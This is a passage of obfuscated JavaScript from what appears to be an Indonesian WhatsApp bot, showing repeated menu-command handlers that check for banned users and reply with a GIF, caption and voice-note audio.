            let _0x4d2007 = _0x1c5671(0x1, 0x1, 0x7e8),
                _0x3d49d1 = _0x1c5671(0x19, 0xc, 0x7e7);
            await _0x40d7a3();
            let _0x1afa94 = '' + _0x932571['gifmenu'];
            await _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'video': {
                    'url': _0x1afa94
                },
                'gifPlayback': !![],
                'caption': _0x39c054(_0x96c6c4, _0x2eeea8, _0x32b235, _0x3d49d1, _0x4d2007, _0xa54fd1, _0xe55fb7, _0x33c99f, _0x358b6e, _0x2d6392, tanggal, runtime, _0x7b6ab6, _0x75f0ff, _0x1b1e88[_0x5804c8(0xd13)], _0x49d6b7, limit, _0x1efa36, glimit, balance, _0x3b7c58),
                'contextInfo': {
                    'externalAdReply': {
                        'title': _0x5804c8(0x178) + _0x32b235 + _0x5804c8(0x92d) + _0x2eeea8,
                        'body': _0x5804c8(0x13b),
                        'thumbnailUrl': _0xfc3dc4,
                        'sourceUrl': _0x10c563,
                        'mediaType': 0x1,
                        'renderLargerThumbnail': !![]
                    }
                }
            }, {
                'quoted': _0x1b1e88
            }), _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'audio': fs[_0x5804c8(0x456)](_0x932571[_0x5804c8(0x304)]),
                'mimetype': _0x5804c8(0x8d4),
                'ptt': !![]
            }, {
                'quoted': _0x1b1e88
            });
        }
        break;
        case _0x5804c8(0x45d): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            _0x1c7aed(_0x5804c8(0x51e), _0x1b1e88[_0x5804c8(0xd13)], _cmd);
            let _0x1777f3 = _0x1c5671(0x1, 0x1, 0x7e8),
                _0x11957a = _0x1c5671(0x19, 0xc, 0x7e7);
            await _0x40d7a3();
            let _0x48f268 = '' + _0x932571['gifmenu'];
            await _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'video': {
                    'url': _0x48f268
                },
                'gifPlayback': !![],
                'caption': _0x48e947(_0x96c6c4, _0x2eeea8, _0x32b235, _0x11957a, _0x1777f3, _0xa54fd1, _0xe55fb7, _0x33c99f, _0x358b6e, _0x2d6392, tanggal, runtime, _0x7b6ab6, _0x75f0ff, _0x1b1e88[_0x5804c8(0xd13)], _0x49d6b7, limit, _0x1efa36, glimit, balance, _0x3b7c58),
                'contextInfo': {
                    'externalAdReply': {
                        'title': _0x5804c8(0x178) + _0x32b235 + _0x5804c8(0x92d) + _0x2eeea8,
                        'body': _0x5804c8(0x13b),
                        'thumbnailUrl': _0xfc3dc4,
                        'sourceUrl': _0x10c563,
                        'mediaType': 0x1,
                        'renderLargerThumbnail': !![]
                    }
                }
            }, {
                'quoted': _0x1b1e88
            }), _0x614da8['sendMessage'](_0x1b1e88['chat'], {
                'audio': fs[_0x5804c8(0x456)](_0x932571[_0x5804c8(0x304)]),
                'mimetype': 'audio/mpeg',
                'ptt': !![]
            }, {
                'quoted': _0x1b1e88
            });
        }
        break;
        case _0x5804c8(0x208): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            _0x1c7aed(_0x5804c8(0x7ce), _0x1b1e88[_0x5804c8(0xd13)], _cmd);
            let _0x5d7142 = _0x1c5671(0x1, 0x1, 0x7e8),
                _0x46a3dc = _0x1c5671(0x19, 0xc, 0x7e7);
            await _0x40d7a3();
            let _0x385ac6 = '' + _0x932571[_0x5804c8(0x9d7)];
            await _0x614da8['sendMessage'](_0x1b1e88[_0x5804c8(0x60f)], {
                'video': {
                    'url': _0x385ac6
                },
                'gifPlayback': !![],
                'caption': _0x48c66e(_0x96c6c4, _0x2eeea8, _0x32b235, _0x46a3dc, _0x5d7142, _0xa54fd1, _0xe55fb7, _0x33c99f, _0x358b6e, _0x2d6392, tanggal, runtime, _0x7b6ab6, _0x75f0ff, _0x1b1e88[_0x5804c8(0xd13)], _0x49d6b7, limit, _0x1efa36, glimit, balance, _0x3b7c58),
                'contextInfo': {
                    'externalAdReply': {
                        'title': _0x5804c8(0x178) + _0x32b235 + _0x5804c8(0x92d) + _0x2eeea8,
                        'body': '𝙅𝙖𝙣𝙜𝙖𝙣 𝙨𝙥𝙖𝙢 𝙗𝙤𝙩 𝙮𝙖𝙝𝙝',
                        'thumbnailUrl': _0xfc3dc4,
                        'sourceUrl': _0x10c563,
                        'mediaType': 0x1,
                        'renderLargerThumbnail': !![]
                    }
                }
            }, {
                'quoted': _0x1b1e88
            }), _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'audio': fs[_0x5804c8(0x456)](_0x932571[_0x5804c8(0x304)]),
                'mimetype': _0x5804c8(0x8d4),
                'ptt': !![]
            }, {
                'quoted': _0x1b1e88
            });
        }
        break;
        case _0x5804c8(0x496): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            _0x1c7aed(_0x5804c8(0x32c), _0x1b1e88['sender'], _cmd);
            let _0x3820b1 = _0x1c5671(0x1, 0x1, 0x7e8),
                _0x536455 = _0x1c5671(0x19, 0xc, 0x7e7);
            await _0x40d7a3();
            let _0x5b3ca8 = '' + _0x932571[_0x5804c8(0x9d7)];
            await _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                'video': {
                    'url': _0x5b3ca8
                },
                'gifPlayback': !![],
                'caption': _0xd7482(_0x96c6c4, _0x2eeea8, _0x32b235, _0x536455, _0x3820b1, _0xa54fd1, _0xe55fb7, _0x33c99f, _0x358b6e, _0x2d6392, tanggal, runtime, _0x7b6ab6, _0x75f0ff, _0x1b1e88[_0x5804c8(0xd13)], _0x49d6b7, limit, _0x1efa36, glimit, balance, _0x3b7c58),
                'contextInfo': {
                    'externalAdReply': {
                        'title': 'Halo ' + _0x32b235 + ' Selamat ' + _0x2eeea8,
                        'body': _0x5804c8(0x13b),
                        'thumbnailUrl': _0xfc3dc4,
                        'sourceUrl': _0x10c563,
                        'mediaType': 0x1,
                        'renderLargerThumbnail': !![]
                    }
                }
            }, {
                'quoted': _0x1b1e88
            }), _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'audio': fs[_0x5804c8(0x456)](_0x932571[_0x5804c8(0x304)]),
                'mimetype': 'audio/mpeg',
                'ptt': !![]
            }, {
                'quoted': _0x1b1e88
            });
        }
        break;
        case 'randomquotes': {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            _0x1c7aed(_0x5804c8(0x5c6), _0x1b1e88[_0x5804c8(0xd13)], _cmd);
            let _0xea1481 = _0x1c5671(0x1, 0x1, 0x7e8),
                _0x5cbc28 = _0x1c5671(0x19, 0xc, 0x7e7);
            await _0x40d7a3();
            let _0x5b4573 = '' + _0x932571[_0x5804c8(0x9d7)];
            await _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                'video': {
                    'url': _0x5b4573
                },
                'gifPlayback': !![],
                'caption': _0x5c3311(_0x96c6c4, _0x2eeea8, _0x32b235, _0x5cbc28, _0xea1481, _0xa54fd1, _0xe55fb7, _0x33c99f, _0x358b6e, _0x2d6392, tanggal, runtime, _0x7b6ab6, _0x75f0ff, _0x1b1e88[_0x5804c8(0xd13)], _0x49d6b7, limit, _0x1efa36, glimit, balance, _0x3b7c58),
                'contextInfo': {
                    'externalAdReply': {
                        'title': 'Halo ' + _0x32b235 + _0x5804c8(0x92d) + _0x2eeea8,
                        'body': _0x5804c8(0x13b),
                        'thumbnailUrl': _0xfc3dc4,
                        'sourceUrl': _0x10c563,
                        'mediaType': 0x1,
                        'renderLargerThumbnail': !![]
                    }
                }
            }, {
                'quoted': _0x1b1e88
            }), _0x614da8['sendMessage'](_0x1b1e88['chat'], {
                'audio': fs['readFileSync'](_0x932571[_0x5804c8(0x304)]),
                'mimetype': _0x5804c8(0x8d4),
                'ptt': !![]
            }, {
                'quoted': _0x1b1e88
            });
        }
        break;
        case _0x5804c8(0x24d): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            _0x1c7aed('#cewekasiamenu', _0x1b1e88[_0x5804c8(0xd13)], _cmd);
            let _0x4f8720 = _0x1c5671(0x1, 0x1, 0x7e8),
                _0x3e7d93 = _0x1c5671(0x19, 0xc, 0x7e7);
            await _0x40d7a3();
            let _0x1fffef = '' + _0x932571[_0x5804c8(0x9d7)];
            await _0x614da8['sendMessage'](_0x1b1e88['chat'], {
                'video': {
                    'url': _0x1fffef
                },
                'gifPlayback': !![],
                'caption': _0x5b4190(_0x96c6c4, _0x2eeea8, _0x32b235, _0x3e7d93, _0x4f8720, _0xa54fd1, _0xe55fb7, _0x33c99f, _0x358b6e, _0x2d6392, tanggal, runtime, _0x7b6ab6, _0x75f0ff, _0x1b1e88[_0x5804c8(0xd13)], _0x49d6b7, limit, _0x1efa36, glimit, balance, _0x3b7c58),
                'contextInfo': {
                    'externalAdReply': {
                        'title': _0x5804c8(0x178) + _0x32b235 + _0x5804c8(0x92d) + _0x2eeea8,
                        'body': '𝙅𝙖𝙣𝙜𝙖𝙣 𝙨𝙥𝙖𝙢 𝙗𝙤𝙩 𝙮𝙖𝙝𝙝',
                        'thumbnailUrl': _0xfc3dc4,
                        'sourceUrl': _0x10c563,
                        'mediaType': 0x1,
                        'renderLargerThumbnail': !![]
                    }
                }
            }, {
                'quoted': _0x1b1e88
            }), _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'audio': fs[_0x5804c8(0x456)](_0x932571[_0x5804c8(0x304)]),
                'mimetype': 'audio/mpeg',
                'ptt': !![]
            }, {
                'quoted': _0x1b1e88
            });
        }
        break;
        case _0x5804c8(0x6fe): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            _0x1c7aed(_0x5804c8(0x888), _0x1b1e88[_0x5804c8(0xd13)], _cmd);
            let _0x4524ba = _0x1c5671(0x1, 0x1, 0x7e8),
                _0x236742 = _0x1c5671(0x19, 0xc, 0x7e7);
            await _0x40d7a3();
            let _0x167fda = '' + _0x932571[_0x5804c8(0x9d7)];
            await _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'video': {
                    'url': _0x167fda
                },
                'gifPlayback': !![],
                'caption': _0x1bd01a(_0x96c6c4, _0x2eeea8, _0x32b235, _0x236742, _0x4524ba, _0xa54fd1, _0xe55fb7, _0x33c99f, _0x358b6e, _0x2d6392, tanggal, runtime, _0x7b6ab6, _0x75f0ff, _0x1b1e88['sender'], _0x49d6b7, limit, _0x1efa36, glimit, balance, _0x3b7c58),
                'contextInfo': {
                    'externalAdReply': {
                        'title': _0x5804c8(0x178) + _0x32b235 + _0x5804c8(0x92d) + _0x2eeea8,
                        'body': _0x5804c8(0x13b),
                        'thumbnailUrl': _0xfc3dc4,
                        'sourceUrl': _0x10c563,
                        'mediaType': 0x1,
                        'renderLargerThumbnail': !![]
                    }
                }
            }, {
                'quoted': _0x1b1e88
            }), _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'audio': fs['readFileSync'](_0x932571[_0x5804c8(0x304)]),
                'mimetype': _0x5804c8(0x8d4),
                'ptt': !![]
            }, {
                'quoted': _0x1b1e88
            });
        }
        break;
        case _0x5804c8(0x644): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            _0x1c7aed(_0x5804c8(0xb16), _0x1b1e88[_0x5804c8(0xd13)], _cmd);
            let _0xb433a6 = _0x1c5671(0x1, 0x1, 0x7e8),
                _0x671a1 = _0x1c5671(0x19, 0xc, 0x7e7);
            await _0x40d7a3();
            let _0x197a54 = '' + _0x932571['gifmenu'];
            await _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'video': {
                    'url': _0x197a54
                },
                'gifPlayback': !![],
                'caption': _0x4efc0a(_0x96c6c4, _0x2eeea8, _0x32b235, _0x671a1, _0xb433a6, _0xa54fd1, _0xe55fb7, _0x33c99f, _0x358b6e, _0x2d6392, tanggal, runtime, _0x7b6ab6, _0x75f0ff, _0x1b1e88[_0x5804c8(0xd13)], _0x49d6b7, limit, _0x1efa36, glimit, balance, _0x3b7c58),
                'contextInfo': {
                    'externalAdReply': {
                        'title': _0x5804c8(0x178) + _0x32b235 + _0x5804c8(0x92d) + _0x2eeea8,
                        'body': _0x5804c8(0x13b),
                        'thumbnailUrl': _0xfc3dc4,
                        'sourceUrl': _0x10c563,
                        'mediaType': 0x1,
                        'renderLargerThumbnail': !![]
                    }
                }
            }, {
                'quoted': _0x1b1e88
            }), _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'audio': fs['readFileSync'](_0x932571['audio_di_bagian_menu']),
                'mimetype': _0x5804c8(0x8d4),
                'ptt': !![]
            }, {
                'quoted': _0x1b1e88
            });
        }
        break;
        case _0x5804c8(0xd6a): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            _0x1c7aed('#ownermenu', _0x1b1e88[_0x5804c8(0xd13)], _cmd);
            let _0x54c36b = _0x1c5671(0x1, 0x1, 0x7e8),
                _0x3be6fe = _0x1c5671(0x19, 0xc, 0x7e7);
            await _0x40d7a3();
            let _0x8bf5b4 = '' + _0x932571[_0x5804c8(0x9d7)];
            await _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'video': {
                    'url': _0x8bf5b4
                },
                'gifPlayback': !![],
                'caption': _0x13940a(_0x96c6c4, _0x2eeea8, _0x32b235, _0x3be6fe, _0x54c36b, _0xa54fd1, _0xe55fb7, _0x33c99f, _0x358b6e, _0x2d6392, tanggal, runtime, _0x7b6ab6, _0x75f0ff, _0x1b1e88[_0x5804c8(0xd13)], _0x49d6b7, limit, _0x1efa36, glimit, balance, _0x3b7c58),
                'contextInfo': {
                    'externalAdReply': {
                        'title': 'Halo ' + _0x32b235 + ' Selamat ' + _0x2eeea8,
                        'body': _0x5804c8(0x13b),
                        'thumbnailUrl': _0xfc3dc4,
                        'sourceUrl': _0x10c563,
                        'mediaType': 0x1,
                        'renderLargerThumbnail': !![]
                    }
                }
            }, {
                'quoted': _0x1b1e88
            }), _0x614da8['sendMessage'](_0x1b1e88[_0x5804c8(0x60f)], {
                'audio': fs['readFileSync'](_0x932571[_0x5804c8(0x304)]),
                'mimetype': _0x5804c8(0x8d4),
                'ptt': !![]
            }, {
                'quoted': _0x1b1e88
            });
        }
        break;
        case _0x5804c8(0x5de): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            _0x1c7aed(_0x5804c8(0x7fc), _0x1b1e88[_0x5804c8(0xd13)], _cmd);
            let _0x42b3af = _0x1c5671(0x1, 0x1, 0x7e8),
                _0x2af044 = _0x1c5671(0x19, 0xc, 0x7e7);
            await _0x40d7a3();
            let _0x5687b3 = '' + _0x932571[_0x5804c8(0x9d7)];
            await _0x614da8['sendMessage'](_0x1b1e88[_0x5804c8(0x60f)], {
                'video': {
                    'url': _0x5687b3
                },
                'gifPlayback': !![],
                'caption': _0x10b8bb(_0x96c6c4, _0x2eeea8, _0x32b235, _0x2af044, _0x42b3af, _0xa54fd1, _0xe55fb7, _0x33c99f, _0x358b6e, _0x2d6392, tanggal, runtime, _0x7b6ab6, _0x75f0ff, _0x1b1e88[_0x5804c8(0xd13)], _0x49d6b7, limit, _0x1efa36, glimit, balance, _0x3b7c58),
                'contextInfo': {
                    'externalAdReply': {
                        'title': _0x5804c8(0x178) + _0x32b235 + _0x5804c8(0x92d) + _0x2eeea8,
                        'body': _0x5804c8(0x13b),
                        'thumbnailUrl': _0xfc3dc4,
                        'sourceUrl': _0x10c563,
                        'mediaType': 0x1,
                        'renderLargerThumbnail': !![]
                    }
                }
            }, {
                'quoted': _0x1b1e88
            }), _0x614da8['sendMessage'](_0x1b1e88['chat'], {
                'audio': fs[_0x5804c8(0x456)](_0x932571[_0x5804c8(0x304)]),
                'mimetype': 'audio/mpeg',
                'ptt': !![]
            }, {
                'quoted': _0x1b1e88
            });
        }
        break;
        case 'asupanmenu': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            _0x1c7aed(_0x5804c8(0x893), _0x1b1e88[_0x5804c8(0xd13)], _cmd);
            let _0xdad75d = _0x1c5671(0x1, 0x1, 0x7e8),
                _0x53f1e9 = _0x1c5671(0x19, 0xc, 0x7e7);
            await _0x40d7a3();
            let _0x3c738e = '' + _0x932571[_0x5804c8(0x9d7)];
            await _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'video': {
                    'url': _0x3c738e
                },
                'gifPlayback': !![],
                'caption': _0x17ec3e(_0x96c6c4, _0x2eeea8, _0x32b235, _0x53f1e9, _0xdad75d, _0xa54fd1, _0xe55fb7, _0x33c99f, _0x358b6e, _0x2d6392, tanggal, runtime, _0x7b6ab6, _0x75f0ff, _0x1b1e88[_0x5804c8(0xd13)], _0x49d6b7, limit, _0x1efa36, glimit, balance, _0x3b7c58),
                'contextInfo': {
                    'externalAdReply': {
                        'title': _0x5804c8(0x178) + _0x32b235 + _0x5804c8(0x92d) + _0x2eeea8,
                        'body': '𝙅𝙖𝙣𝙜𝙖𝙣 𝙨𝙥𝙖𝙢 𝙗𝙤𝙩 𝙮𝙖𝙝𝙝',
                        'thumbnailUrl': _0xfc3dc4,
                        'sourceUrl': _0x10c563,
                        'mediaType': 0x1,
                        'renderLargerThumbnail': !![]
                    }
                }
            }, {
                'quoted': _0x1b1e88
            }), _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'audio': fs[_0x5804c8(0x456)](_0x932571[_0x5804c8(0x304)]),
                'mimetype': _0x5804c8(0x8d4),
                'ptt': !![]
            }, {
                'quoted': _0x1b1e88
            });
        }
        break;
        case 'randomsticker': {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            _0x1c7aed(_0x5804c8(0x761), _0x1b1e88[_0x5804c8(0xd13)], _cmd);
            let _0x44b81a = _0x1c5671(0x1, 0x1, 0x7e8),
                _0x3445bb = _0x1c5671(0x19, 0xc, 0x7e7);
            await _0x40d7a3();
            let _0x5316cb = '' + _0x932571[_0x5804c8(0x9d7)];
            await _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'video': {
                    'url': _0x5316cb
                },
                'gifPlayback': !![],
                'caption': _0x44eb67(_0x96c6c4, _0x2eeea8, _0x32b235, _0x3445bb, _0x44b81a, _0xa54fd1, _0xe55fb7, _0x33c99f, _0x358b6e, _0x2d6392, tanggal, runtime, _0x7b6ab6, _0x75f0ff, _0x1b1e88[_0x5804c8(0xd13)], _0x49d6b7, limit, _0x1efa36, glimit, balance, _0x3b7c58),
                'contextInfo': {
                    'externalAdReply': {
                        'title': _0x5804c8(0x178) + _0x32b235 + _0x5804c8(0x92d) + _0x2eeea8,
                        'body': '𝙅𝙖𝙣𝙜𝙖𝙣 𝙨𝙥𝙖𝙢 𝙗𝙤𝙩 𝙮𝙖𝙝𝙝',
                        'thumbnailUrl': _0xfc3dc4,
                        'sourceUrl': _0x10c563,
                        'mediaType': 0x1,
                        'renderLargerThumbnail': !![]
                    }
                }
            }, {
                'quoted': _0x1b1e88
            }), _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'audio': fs['readFileSync'](_0x932571[_0x5804c8(0x304)]),
                'mimetype': _0x5804c8(0x8d4),
                'ptt': !![]
            }, {
                'quoted': _0x1b1e88
            });
        }
        break;
        case _0x5804c8(0x926): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            _0x1c7aed(_0x5804c8(0x698), _0x1b1e88[_0x5804c8(0xd13)], _cmd);
            let _0x38f548 = _0x1c5671(0x1, 0x1, 0x7e8),
                _0x232e8d = _0x1c5671(0x19, 0xc, 0x7e7);
            await _0x40d7a3();
            let _0x8f0df6 = '' + _0x932571['gifmenu'];
            await _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'video': {
                    'url': _0x8f0df6
                },
                'gifPlayback': !![],
                'caption': _0x2d5509(_0x96c6c4, _0x2eeea8, _0x32b235, _0x232e8d, _0x38f548, _0xa54fd1, _0xe55fb7, _0x33c99f, _0x358b6e, _0x2d6392, tanggal, runtime, _0x7b6ab6, _0x75f0ff, _0x1b1e88[_0x5804c8(0xd13)], _0x49d6b7, limit, _0x1efa36, glimit, balance, _0x3b7c58),
                'contextInfo': {
                    'externalAdReply': {
                        'title': _0x5804c8(0x178) + _0x32b235 + _0x5804c8(0x92d) + _0x2eeea8,
                        'body': _0x5804c8(0x13b),
                        'thumbnailUrl': _0xfc3dc4,
                        'sourceUrl': _0x10c563,
                        'mediaType': 0x1,
                        'renderLargerThumbnail': !![]
                    }
                }
            }, {
                'quoted': _0x1b1e88
            }), _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                'audio': fs[_0x5804c8(0x456)](_0x932571[_0x5804c8(0x304)]),
                'mimetype': 'audio/mpeg',
                'ptt': !![]
            }, {
                'quoted': _0x1b1e88
            });
        }
        break;
        case _0x5804c8(0x641): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            _0x1c7aed(_0x5804c8(0x935), _0x1b1e88[_0x5804c8(0xd13)], _cmd);
            let _0x4acb74 = _0x1c5671(0x1, 0x1, 0x7e8),
                _0xab38ac = _0x1c5671(0x19, 0xc, 0x7e7);
            await _0x40d7a3();
            let _0x49cd59 = '' + _0x932571[_0x5804c8(0x9d7)];
            await _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'video': {
                    'url': _0x49cd59
                },
                'gifPlayback': !![],
                'caption': _0x1f74a2(_0x96c6c4, _0x2eeea8, _0x32b235, _0xab38ac, _0x4acb74, _0xa54fd1, _0xe55fb7, _0x33c99f, _0x358b6e, _0x2d6392, tanggal, runtime, _0x7b6ab6, _0x75f0ff, _0x1b1e88[_0x5804c8(0xd13)], _0x49d6b7, limit, _0x1efa36, glimit, balance, _0x3b7c58),
                'contextInfo': {
                    'externalAdReply': {
                        'title': _0x5804c8(0x178) + _0x32b235 + ' Selamat ' + _0x2eeea8,
                        'body': _0x5804c8(0x13b),
                        'thumbnailUrl': _0xfc3dc4,
                        'sourceUrl': _0x10c563,
                        'mediaType': 0x1,
                        'renderLargerThumbnail': !![]
                    }
                }
            }, {
                'quoted': _0x1b1e88
            }), _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'audio': fs[_0x5804c8(0x456)](_0x932571[_0x5804c8(0x304)]),
                'mimetype': _0x5804c8(0x8d4),
                'ptt': !![]
            }, {
                'quoted': _0x1b1e88
            });
        }
        break;
        case _0x5804c8(0x46a): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            _0x1c7aed(_0x5804c8(0x5a3), _0x1b1e88[_0x5804c8(0xd13)], _cmd);
            let _0x30c55d = _0x1c5671(0x1, 0x1, 0x7e8),
                _0x15e406 = _0x1c5671(0x19, 0xc, 0x7e7);
            await _0x40d7a3();
            let _0x5a7dc3 = '' + _0x932571[_0x5804c8(0x9d7)];
            await _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'video': {
                    'url': _0x5a7dc3
                },
                'gifPlayback': !![],
                'caption': _0x3fdf07(_0x96c6c4, _0x2eeea8, _0x32b235, _0x15e406, _0x30c55d, _0xa54fd1, _0xe55fb7, _0x33c99f, _0x358b6e, _0x2d6392, tanggal, runtime, _0x7b6ab6, _0x75f0ff, _0x1b1e88[_0x5804c8(0xd13)], _0x49d6b7, limit, _0x1efa36, glimit, balance, _0x3b7c58),
                'contextInfo': {
                    'externalAdReply': {
                        'title': _0x5804c8(0x178) + _0x32b235 + _0x5804c8(0x92d) + _0x2eeea8,
                        'body': '𝙅𝙖𝙣𝙜𝙖𝙣 𝙨𝙥𝙖𝙢 𝙗𝙤𝙩 𝙮𝙖𝙝𝙝',
                        'thumbnailUrl': _0xfc3dc4,
                        'sourceUrl': _0x10c563,
                        'mediaType': 0x1,
                        'renderLargerThumbnail': !![]
                    }
                }
            }, {
                'quoted': _0x1b1e88
            }), _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'audio': fs['readFileSync'](_0x932571['audio_di_bagian_menu']),
                'mimetype': _0x5804c8(0x8d4),
                'ptt': !![]
            }, {
                'quoted': _0x1b1e88
            });
        }
        break;
        case _0x5804c8(0x79c): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            _0x1c7aed(_0x5804c8(0xbe8), _0x1b1e88[_0x5804c8(0xd13)], _cmd);
            let _0x56a5f9 = _0x1c5671(0x1, 0x1, 0x7e8),
                _0x1e3e01 = _0x1c5671(0x19, 0xc, 0x7e7);
            await _0x40d7a3();
            let _0x23b682 = '' + _0x932571['gifmenu'];
            await _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                'video': {
                    'url': _0x23b682
                },
                'gifPlayback': !![],
                'caption': _0x587632(_0x96c6c4, _0x2eeea8, _0x32b235, _0x1e3e01, _0x56a5f9, _0xa54fd1, _0xe55fb7, _0x33c99f, _0x358b6e, _0x2d6392, tanggal, runtime, _0x7b6ab6, _0x75f0ff, _0x1b1e88[_0x5804c8(0xd13)], _0x49d6b7, limit, _0x1efa36, glimit, balance, _0x3b7c58),
                'contextInfo': {
                    'externalAdReply': {
                        'title': _0x5804c8(0x178) + _0x32b235 + _0x5804c8(0x92d) + _0x2eeea8,
                        'body': _0x5804c8(0x13b),
                        'thumbnailUrl': _0xfc3dc4,
                        'sourceUrl': _0x10c563,
                        'mediaType': 0x1,
                        'renderLargerThumbnail': !![]
                    }
                }
            }, {
                'quoted': _0x1b1e88
            }), _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'audio': fs[_0x5804c8(0x456)](_0x932571['audio_di_bagian_menu']),
                'mimetype': _0x5804c8(0x8d4),
                'ptt': !![]
            }, {
                'quoted': _0x1b1e88
            });
        }
        break;
        case _0x5804c8(0x43f): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            _0x1c7aed(_0x5804c8(0xc91), _0x1b1e88[_0x5804c8(0xd13)], _cmd);
            let _0x3043ee = _0x1c5671(0x1, 0x1, 0x7e8),
                _0x5680b9 = _0x1c5671(0x19, 0xc, 0x7e7);
            await _0x40d7a3();
            let _0x4b2f85 = '' + _0x932571[_0x5804c8(0x9d7)];
            await _0x614da8['sendMessage'](_0x1b1e88[_0x5804c8(0x60f)], {
                'video': {
                    'url': _0x4b2f85
                },
                'gifPlayback': !![],
                'caption': _0x2646ec(_0x96c6c4, _0x2eeea8, _0x32b235, _0x5680b9, _0x3043ee, _0xa54fd1, _0xe55fb7, _0x33c99f, _0x358b6e, _0x2d6392, tanggal, runtime, _0x7b6ab6, _0x75f0ff, _0x1b1e88[_0x5804c8(0xd13)], _0x49d6b7, limit, _0x1efa36, glimit, balance, _0x3b7c58),
                'contextInfo': {
                    'externalAdReply': {
                        'title': 'Halo ' + _0x32b235 + ' Selamat ' + _0x2eeea8,
                        'body': '𝙅𝙖𝙣𝙜𝙖𝙣 𝙨𝙥𝙖𝙢 𝙗𝙤𝙩 𝙮𝙖𝙝𝙝',
                        'thumbnailUrl': _0xfc3dc4,
                        'sourceUrl': _0x10c563,
                        'mediaType': 0x1,
                        'renderLargerThumbnail': !![]
                    }
                }
            }, {
                'quoted': _0x1b1e88
            }), _0x614da8['sendMessage'](_0x1b1e88[_0x5804c8(0x60f)], {
                'audio': fs['readFileSync'](_0x932571[_0x5804c8(0x304)]),
                'mimetype': 'audio/mpeg',
                'ptt': !![]
            }, {
                'quoted': _0x1b1e88
            });
        }
        break;
        case _0x5804c8(0xcd8): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            _0x1c7aed(_0x5804c8(0x4a8), _0x1b1e88[_0x5804c8(0xd13)], _cmd);
            let _0x3c3a0c = _0x1c5671(0x1, 0x1, 0x7e8),
                _0x55a04c = _0x1c5671(0x19, 0xc, 0x7e7);
            await _0x40d7a3();
            let _0x3cffd4 = '' + _0x932571[_0x5804c8(0x9d7)];
            await _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                'video': {
                    'url': _0x3cffd4
                },
                'gifPlayback': !![],
                'caption': _0x3e90e5(_0x96c6c4, _0x2eeea8, _0x32b235, _0x55a04c, _0x3c3a0c, _0xa54fd1, _0xe55fb7, _0x33c99f, _0x358b6e, _0x2d6392, tanggal, runtime, _0x7b6ab6, _0x75f0ff, _0x1b1e88['sender'], _0x49d6b7, limit, _0x1efa36, glimit, balance, _0x3b7c58),
                'contextInfo': {
                    'externalAdReply': {
                        'title': _0x5804c8(0x178) + _0x32b235 + ' Selamat ' + _0x2eeea8,
                        'body': '𝙅𝙖𝙣𝙜𝙖𝙣 𝙨𝙥𝙖𝙢 𝙗𝙤𝙩 𝙮𝙖𝙝𝙝',
                        'thumbnailUrl': _0xfc3dc4,
                        'sourceUrl': _0x10c563,
                        'mediaType': 0x1,
                        'renderLargerThumbnail': !![]
                    }
                }
            }, {
                'quoted': _0x1b1e88
            }), _0x614da8['sendMessage'](_0x1b1e88[_0x5804c8(0x60f)], {
                'audio': fs['readFileSync'](_0x932571['audio_di_bagian_menu']),
                'mimetype': _0x5804c8(0x8d4),
                'ptt': !![]
            }, {
                'quoted': _0x1b1e88
            });
        }
        break;
        case _0x5804c8(0x7ac): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
